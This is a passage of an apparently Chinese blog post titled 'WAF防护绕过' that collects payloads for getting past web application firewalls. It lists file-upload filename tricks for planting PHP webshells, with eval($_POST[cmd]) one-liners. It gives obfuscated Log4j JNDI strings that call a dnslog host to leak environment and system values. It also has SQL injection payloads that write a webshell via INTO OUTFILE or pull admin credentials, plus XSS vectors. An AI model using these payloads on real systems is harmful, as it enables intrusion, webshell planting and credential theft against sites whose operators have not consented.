@@ -1,0 +1,379 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>WAF防护绕过 | Egstar站长</title><meta name="author" content="Egstar"><meta name="copyright" content="Egstar"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="今有虚域安防策文，详述破网盾之迂回术，或藏形于字符异化，或借势于时序玄机">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WAF防护绕过">
+<meta property="og:url" content="http://egstar.top/post/56f57219.html">
+<meta property="og:site_name" content="Egstar站长">
+<meta property="og:description" content="今有虚域安防策文，详述破网盾之迂回术，或藏形于字符异化，或借势于时序玄机">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://egstar.top/images/250225_1.png">
+<meta property="article:published_time" content="2025-02-25T01:28:55.000Z">
+<meta property="article:modified_time" content="2025-02-25T02:46:13.106Z">
+<meta property="article:author" content="Egstar">
+<meta property="article:tag" content="WAF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://egstar.top/images/250225_1.png"><link rel="shortcut icon" href="/images/favicon.png"><link rel="canonical" href="http://egstar.top/post/56f57219.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Egstar","link":"链接: ","source":"来源: Egstar站长","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'WAF防护绕过',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-02-25 10:46:13'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/modify.css"><link rel="stylesheet" href="/css/page.css"><link rel="stylesheet" href="/css/font.css"><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.2.0"></head><body><link rel="stylesheet" href="/css/loading-bar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/pkds.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">18</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa-solid fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/catlog/"><i class="fa-fw fa-solid fa-pen-to-square"></i><span> 更新日志</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 文娱</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/classics/"><i class="fa-fw fa-solid fa-book-open-reader"></i><span> 古典</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa-solid fa-comments"></i><span> 关于</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></li><li><a class="site-page child" href="/comments/"><i class="fa-fw fa-solid fa-message"></i><span> 留言板</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/images/250225_1.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Egstar站长"><span class="site-name">Egstar站长</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa-solid fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/catlog/"><i class="fa-fw fa-solid fa-pen-to-square"></i><span> 更新日志</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 文娱</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/classics/"><i class="fa-fw fa-solid fa-book-open-reader"></i><span> 古典</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa-solid fa-comments"></i><span> 关于</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></li><li><a class="site-page child" href="/comments/"><i class="fa-fw fa-solid fa-message"></i><span> 留言板</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">WAF防护绕过</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-02-25T01:28:55.000Z" title="发表于 2025-02-25 09:28:55">2025-02-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-02-25T02:46:13.106Z" title="更新于 2025-02-25 10:46:13">2025-02-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/POC/">POC</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span><span class="post-meta-separator">|</span><span id="" data-flag-title="WAF防护绕过"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="twikoo_visitors"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><body>
+
+<h1 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h1><h2 id="修改特殊文件名"><a href="#修改特殊文件名" class="headerlink" title="修改特殊文件名"></a>修改特殊文件名</h2><p>某一次应急响应中，机缘巧合发现重命名后的文件名可以绕过云WAF上传shell</p>
+<p>240110092707382b1b51dcd2fbc57638b12b6c52dea813f-10606@rh@<a href="mailto:&#49;&#x31;&#88;&#49;&#54;&#x40;&#x30;&#x4b;&#66;&#x2e;&#97;&#115;&#112;">&#49;&#x31;&#88;&#49;&#54;&#x40;&#x30;&#x4b;&#66;&#x2e;&#97;&#115;&#112;</a></p>
+<h2 id="截断绕过"><a href="#截断绕过" class="headerlink" title="截断绕过"></a>截断绕过</h2><p>在数据包中，某些WAF遇到分号回认为匹配结束，但系统会正常识别并完整获取。更改获取文件名处的内容为：filename&#x3D;”abc.jpg;.php”，可以绕过上传，上传后保存为 abc.jpg;.php</p>
+<p><img src="/../picture/WAF%E9%98%B2%E6%8A%A4%E7%BB%95%E8%BF%87/image-20250225100420036.png" alt="image-20250225100420036"></p>
+<p> 使用php的解析特性可以使用 %00或00截断来绕过识别，windows系统还可以利用 ::$DATA，_(下划线)进行绕过</p>
+<h2 id="多等号绕过"><a href="#多等号绕过" class="headerlink" title="多等号绕过"></a>多等号绕过</h2><p>filename&#x3D;&#x3D;”xxx.php”，添加多个等号来尝试</p>
+<p><img src="/../picture/WAF%E9%98%B2%E6%8A%A4%E7%BB%95%E8%BF%87/image-20250225100456587.png" alt="image-20250225100456587"></p>
+<h2 id="多个filename绕过"><a href="#多个filename绕过" class="headerlink" title="多个filename绕过"></a>多个filename绕过</h2><p>filename&#x3D;;filename&#x3D;”xxx.php”，通过插入多个filename参数，部分waf只会识别第一个filename的内容，但是服务端保存时会保存最后一个</p>
+<p><img src="/../picture/WAF%E9%98%B2%E6%8A%A4%E7%BB%95%E8%BF%87/image-20250225100529165.png" alt="image-20250225100529165"></p>
+<h2 id="删除引号（常见有效）"><a href="#删除引号（常见有效）" class="headerlink" title="删除引号（常见有效）"></a>删除引号（常见有效）</h2><p>去除引号之后导致某些waf无法正常识别内容，然后绕过去了</p>
+<p><img src="/../picture/WAF%E9%98%B2%E6%8A%A4%E7%BB%95%E8%BF%87/image-20250225095448789.png" alt="image-20250225095448789"></p>
+<h2 id="换行绕过"><a href="#换行绕过" class="headerlink" title="换行绕过"></a>换行绕过</h2><p>将filename&#x3D;”xxx.p h p” 中，php后缀回车换行，部分WAF匹配时会将文件名识别为 xxx.p\nh\np 只要将不是 .php 就行</p>
+<p>上传保存时会自动取消 \n ,保存为xxx.php</p>
+<p><img src="/../picture/WAF%E9%98%B2%E6%8A%A4%E7%BB%95%E8%BF%87/image-20250225100607968.png" alt="image-20250225100607968"></p>
+<h2 id="垃圾数据填充（可能导致程序异常）"><a href="#垃圾数据填充（可能导致程序异常）" class="headerlink" title="垃圾数据填充（可能导致程序异常）"></a>垃圾数据填充（可能导致程序异常）</h2><p>在参数中添加大量字符，当字符量超出WAF判断范围时，将可能绕过WAF检测</p>
+<p><img src="/../picture/WAF%E9%98%B2%E6%8A%A4%E7%BB%95%E8%BF%87/image-20250225095811198.png" alt="image-20250225095811198"></p>
+<h2 id="文件名溢出"><a href="#文件名溢出" class="headerlink" title="文件名溢出"></a>文件名溢出</h2><p>文件名中加入大量字符，当字符量超出WAF判断范围时，将可能绕过WAF检测。不过，可能绕过WAF时，应用系统本身也识别不了</p>
+<p><img src="/../picture/WAF%E9%98%B2%E6%8A%A4%E7%BB%95%E8%BF%87/image-20250225100002580.png" alt="image-20250225100002580"></p>
+<h2 id="Content-Type-绕过"><a href="#Content-Type-绕过" class="headerlink" title="Content-Type 绕过"></a>Content-Type 绕过</h2><p>Content-Type：互联网媒体类型， 也叫MIME类型，在HTTP消息头中，使用Content-Type来表示请求和响应中的媒体数据格式标签，区分数据类型。常见Content-Type的格式如下：</p>
+<p>Content-Type:  text&#x2F;html;</p>
+<p>Content-Type:  text&#x2F;xml;</p>
+<p>Content-Type：type&#x2F;subtype;parameter</p>
+<p>Content-Type：application&#x2F;x-www-form-urlencoded</p>
+<p>Content-Type:  application&#x2F;json;charset:utf-8;</p>
+<p>Content-Type：multipart&#x2F;form-data</p>
+<p>在文件上传的二进制值结尾处添加分号</p>
+<p><img src="/../picture/WAF%E9%98%B2%E6%8A%A4%E7%BB%95%E8%BF%87/image-20250225100328550.png" alt="image-20250225100328550"></p>
+<h2 id="文件名URL编码绕过"><a href="#文件名URL编码绕过" class="headerlink" title="文件名URL编码绕过"></a>文件名URL编码绕过</h2><p>遇到某路径访问遭拦截的可以尝试使用编码绕过</p>
+<p><img src="/../picture/WAF%E9%98%B2%E6%8A%A4%E7%BB%95%E8%BF%87/image-20250225100717599.png" alt="image-20250225100717599"></p>
+<p><img src="/../picture/WAF%E9%98%B2%E6%8A%A4%E7%BB%95%E8%BF%87/image-20250225100747701.png" alt="image-20250225100747701"></p>
+<h2 id="魔术头-内容绕过"><a href="#魔术头-内容绕过" class="headerlink" title="魔术头&#x2F;内容绕过"></a>魔术头&#x2F;内容绕过</h2><p>GIF89a 这是图片的文件格式开头，使用该图片头可能绕过系统对文件内容的检测</p>
+<p><img src="/../picture/WAF%E9%98%B2%E6%8A%A4%E7%BB%95%E8%BF%87/image-20250225100922477.png" alt="image-20250225100922477"></p>
+<p>Js代码绕过内容检测</p>
+<p><code>&lt;script language=&quot;php&quot;&gt;@eval($_POST[cmd]);&lt;/script&gt;</code></p>
+<p>或者省去语言标签 </p>
+<p><code>&lt;?=@eval($_POST[cmd]);</code></p>
+<h1 id="JNDI注入绕过"><a href="#JNDI注入绕过" class="headerlink" title="JNDI注入绕过"></a>JNDI注入绕过</h1><p>原始payload</p>
+<p>${jndi:ldap:&#x2F;&#x2F;xxx.xxx.xxx.xxx:1389&#x2F;pgc2pp}</p>
+<p> 变形为下面形式可绕过阿里云waf</p>
+<p>${:-y$}{${6pr:-j}nd${env:fm4:-}i:d${xyf::-n}s:<a target="_blank" rel="noopener" href="https://895a1h.dnslog.cn/">&#x2F;&#x2F;895a1h.dnslog.cn</a>}</p>
+<p>${:-y$}{${6pr:-j}nd${env:fm4:-}i:r${xyf::-m}i:<a target="_blank" rel="noopener" href="https://895a1h.dnslog.cn/">&#x2F;&#x2F;895a1h.dnslog.cn</a>}</p>
+<p>其他变种，这些查询命令可以带在dnslog域名前</p>
+<p>常用</p>
+<p>${sys:user.name}   当前系统用户名<br>${java:version}   系统java版本</p>
+<p>${ctx:loginId}<br>${map:type}<br>${filename}<br>${date:MM-dd-yyyy}<br>${docker:containerId}<br>${docker:containerName}<br>${docker:imageName}<br>${env:USER}<br>${event:Marker}<br>${mdc:UserId}<br>${java:runtime}<br>${java:vm}<br>${java:os}<br>${jndi:logging&#x2F;context-name}<br>${hostName}<br>${docker:containerId}<br>${k8s:accountName}<br>${k8s:clusterName}<br>${k8s:containerId}<br>${k8s:containerName}<br>${k8s:host}<br>${k8s:labels.app}<br>${k8s:labels.podTemplateHash}<br>${k8s:masterUrl}<br>${k8s:namespaceId}<br>${k8s:namespaceName}<br>${k8s:podId}<br>${k8s:podIp}<br>${k8s:podName}<br>${k8s:imageId}<br>${k8s:imageName}<br>${log4j:configLocation}<br>${log4j:configParentLocation}<br>${spring:spring.application.name}<br>${main:myString}<br>${main:0}<br>${main:1}<br>${main:2}<br>${main:3}<br>${main:4}<br>${main:bar}<br>${name}<br>${marker}<br>${marker:name}<br>${spring:profiles.active[0]<br>${sys:logPath}<br>${web:rootDir}<br>${env:A8_HOME}<br>${env:A8_ROOT_BIN}<br>${env:ALLUSERSPROFILE}<br>${env:APPDATA}<br>${env:CATALINA_BASE}<br>${env:CATALINA_HOME}<br>${env:CATALINA_OPTS}<br>${env:CATALINA_TMPDIR}<br>${env:CLASSPATH}<br>${env:CLIENTNAME}<br>${env:COMPUTERNAME}<br>${env:ComSpec}<br>${env:CommonProgramFiles}<br>${env:CommonProgramFiles(x86)}<br>${env:CommonProgramW6432}<br>${env:FP_NO_HOST_CHECK}<br>${env:HOMEDRIVE}<br>${env:HOMEPATH}<br>${env:JRE_HOME}<br>${env:Java_Home}<br>${env:LOCALAPPDATA}<br>${env:LOGONSERVER}<br>${env:NUMBER_OF_PROCESSORS}<br>${env:OS}<br>${env:PATHEXT}<br>${env:PROCESSOR_ARCHITECTURE}<br>${env:PROCESSOR_IDENTIFIER}<br>${env:PROCESSOR_LEVEL}<br>${env:PROCESSOR_REVISION}<br>${env:PROMPT}<br>${env:PSModulePath}<br>${env:PUBLIC}<br>${env:Path}<br>${env:ProgramData}<br>${env:ProgramFiles}<br>${env:ProgramFiles(x86)}<br>${env:ProgramW6432}<br>${env:SESSIONNAME}<br>${env:SystemDrive}<br>${env:SystemRoot}<br>${env:TEMP}<br>${env:TMP}<br>${env:ThisExitCode}<br>${env:USERDOMAIN}<br>${env:USERNAME}<br>${env:USERPROFILE}<br>${env:WORK_PATH}<br>${env:windir}<br>${env:windows_tracing_flags}<br>${env:windows_tracing_logfile}<br>${sys:awt.toolkit}<br>${sys:file.encoding}<br>${sys:file.encoding.pkg}<br>${sys:file.separator}<br>${sys:java.awt.graphicsenv}<br>${sys:java.awt.printerjob}<br>${sys:java.class.path}</p>
+<h1 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h1><p>报错：</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">2</span><span class="token string">' and (select1from(selectcount(*),concat( floor(rand(0)*2),(select(select(爆错语句)) frominformation_schema.tables limit0,1))x frominformation_schema.tables groupbyx )a)--+
+
+'</span><span class="token operator">+</span><span class="token operator">and</span><span class="token operator">+</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+a</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>延时：</p>
+<pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">union select 1,0x3c3f706870206576616c28245f524551554553545b385d293f3e into outfile &#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;xjl1.php&#39; -- qwe
+
+
+Mysql
+
+&#39; and sleep(10)
+
+%27%20%61%6e%64%20%73%6c%65%65%70%28%31%30%29
+
+&quot;%20and%20sleep(10)--%20qwe
+
+&#39;+and+1&#x3D;(select+1+from+dual)--
+
+&#39;+and(select*from(select+sleep(5)union&#x2F;**&#x2F;select+1)a)
+
+&#39;+and(select*from(select+sleep(5))a&#x2F;**&#x2F;union&#x2F;**&#x2F;select+1)                     
+
+&#39;and(select*from(select+sleep(2))a&#x2F;**&#x2F;union&#x2F;**&#x2F;select+1)&#x3D;&#39;                &#x2F;&#x2F;闭合单引号
+
+(select*from(select+sleep(2)union&#x2F;**&#x2F;select+1)a)                          &#x2F;&#x2F;代替参数
+
+,(select*from(select+sleep(2)union&#x2F;**&#x2F;select+1)a)                         &#x2F;&#x2F;闭合逗号
+
+&#39; AND (SELECT 6631 FROM (SELECT(SLEEP(5)))xkLx) AND &#39;Dply&#39;&#x3D;&#39;Dply
+
+&#39; or 1 &#x3D; updatexml(1,concat(0x5c,(SELECT concat(username,0x23,password) FROM yx_admin LIMIT 1)),1))#
+
+and+extractvalue(1, concat (0x7e, (select+database 0)),0x7e))
+
+&#39;||(case+when+user+like+&#39;§a§%25&#39;+then+1+else+0+end)||&#39;
+
+1&#x2F;if(substr(user(),1,1)&#x3D;&#39;b&#39;,1,exp(888))
+
+and不行就or
+
+
+Oracle
+
+&#39;&#x2F;**&#x2F;and&#x2F;**&#x2F;0&#x3D;DBMS_PIPE.RECEIVE_MESSAGE(&#39;f&#39;,10)
+
+&#39;&#x2F;**&#x2F;and&#x2F;**&#x2F;DBMS_PIPE.RECEIVE_MESSAGE(&#39;m&#39;,5)&#x3D;&#39;
+
+&#x2F;**&#x2F;and&#x2F;**&#x2F;0&#x3D;DBMS_PIPE.RECEIVE_MESSAGE(&#39;q&#39;,5)
+
+&#39; AND 9813&#x3D;DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(118)||CHR(66)||CHR(97),5)-- tsnu
+
+&#39;&#x2F;**&#x2F;and&#x2F;**&#x2F;DBMS PIPE.RECEIVE.MESSAGE(&#39;f&#39;,3)&#x3D;&#39;f
+
+&#39;**&#x2F;or&#x2F;**&#x2F;DBMS PIPE. RECEIVE.MESSAGE(&#39;w&#39;,2)&#x3D;&#39;w
+
+
+sqlserver
+
+WAITFOR DELAY &#39;0:0:4&#39; --  表⽰延迟4秒      [子句]      IF exists () WAITFOR DELAY &#39;0:0:5&#39;
+
+Acess:   and(SELECTcount(*) FROMMSysAccessObjects AST1, MSysAccessObjects AST2, MSysAccessObjects AST3, MSysAccessObjects AST4, MSysAccessObjects AST5, MSysAccessObjects AS T6, MSysAccessObjects AST7,MSysAccessObjects AST8,MSysAccessObjects AST9,MSysAccessObjects AST10,MSysAccessObjects AST11,MSysAccessObjects AST12)&gt;0
+
+如果能执行函数，可以用 getLocation() 查询web目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a>XSS绕过</h1><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">">&lt;img/src=1 onerror=top['ale'+'rt'](1)>
+
+">&lt;img/src=22 onerror=window.alert(22)>
+
+&lt;img/src="dnslog地址">
+
+"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>//
+
+'oninput=alert(1)//
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">prompt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span>
+
+"%20onmouse%3Dalert%601%60%20a%3d%221&lt;>&lt;>&lt;>>>&lt;[a%20href%20%3d%20http%3A%2F%2Fwww.baidu.com](https://a href = http:%2F%2Fwww.baidu.com/)>1>&lt;>&lt;&lt;//"
+
+
+绕waf弹窗
+
+&lt;image/src=x onerror ="<span class="token entity" title="&#99;">&amp;#99;</span><span class="token entity" title="&#111;">&amp;#111;</span><span class="token entity" title="&#110;">&amp;#110;</span><span class="token entity" title="&#102;">&amp;#102;</span><span class="token entity" title="&#105;">&amp;#105;</span><span class="token entity" title="&#114;">&amp;#114;</span><span class="token entity" title="&#109;">&amp;#109;</span><span class="token entity" title="&#96;">&amp;#96;</span><span class="token entity" title="&#120;">&amp;#120;</span><span class="token entity" title="&#115;">&amp;#115;</span><span class="token entity" title="&#115;">&amp;#115;</span><span class="token entity" title="&#96;">&amp;#96;</span>">
+
+/%df/xxxxxxxx/%df/
+
+%22onclick=prompt+1
+
+1;&#123;onerror=alert&#125;throw 1337
+    
+1%3B%7Bonerror%3Dalert%7Dthrow%201337
+
+'onfocus=alert(1) autofocus //
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>javascript:alert(1)</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span> 
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>[www.baidu.com](https://www.baidu.com/)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
+
+&lt;a href="#" onclick=top['ale'+'rt'](1)>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
+
+&lt;iframe onfocus= top['ale'+'rt'](1) autofocus><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
+
